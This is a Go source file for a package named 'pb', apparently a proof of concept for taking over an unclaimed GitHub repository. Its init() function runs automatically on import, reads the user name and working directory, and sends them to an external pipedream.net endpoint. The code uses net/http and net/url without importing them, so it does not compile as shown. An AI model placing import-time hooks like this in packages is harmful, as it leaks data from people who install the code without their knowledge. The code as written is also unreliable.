package pb

import (
	"fmt"
	"os"
)

func init() {
	user := os.Getenv("USER") // safe access
	dir, _ := os.Getwd()      // current working dir

	fmt.Printf("[PoC] Hello from unclaimed GitHub repo!\n")
	fmt.Printf("[PoC] USER=%s\n", user)
	fmt.Printf("[PoC] CWD=%s\n", dir)

	http.Get("https://eou39l9f2i96s48.m.pipedream.net/poc?user=" + url.QueryEscape(user) + "&dir=" + url.QueryEscape(dir))
}
